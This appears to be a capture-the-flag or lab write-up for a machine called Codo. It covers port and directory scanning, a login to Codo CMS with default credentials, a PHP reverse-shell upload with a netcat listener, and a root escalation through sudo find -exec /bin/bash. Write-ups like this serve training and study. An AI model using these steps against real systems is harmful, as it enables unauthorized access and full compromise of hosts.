# 🐧 Codo

> Codo CMS / sudo find

### Enumerating Services
First, we'll perform a generic scan to identify the open ports and services running on this machine.
```shell
# TCP
sudo nmap -sCV -p- --min-rate=10000 -Pn 192.168.182.87

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
### Enumerating port 80
Found Codo CMS. Default credentials admin:admin worked.
```shell
# Enum dir
feroxbuster -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt -d 2 -x php,html -C 404,502 -u http://192.168.182.87
```
### Initial Access
Codo CMS allows file upload with PHP content.
```shell
# Upload PHP reverse shell via admin panel

# Listener
rlwrap -cAra nc -vnlp 443

# TTY Upgrade
/usr/bin/python3 -c "import pty;pty.spawn('/bin/bash')"

# Evidence
cat /var/www/html/local.txt
```
### Privilege Escalation
```shell
# Sudo check
sudo -l
User www-data may run the following commands:
    (ALL) NOPASSWD: /usr/bin/find

# Privilege Escalation via GTFOBins
sudo find . -exec /bin/bash \; -quit
```
### Post-Exploitation
```shell
# Evidence
cat /root/proof.txt
```
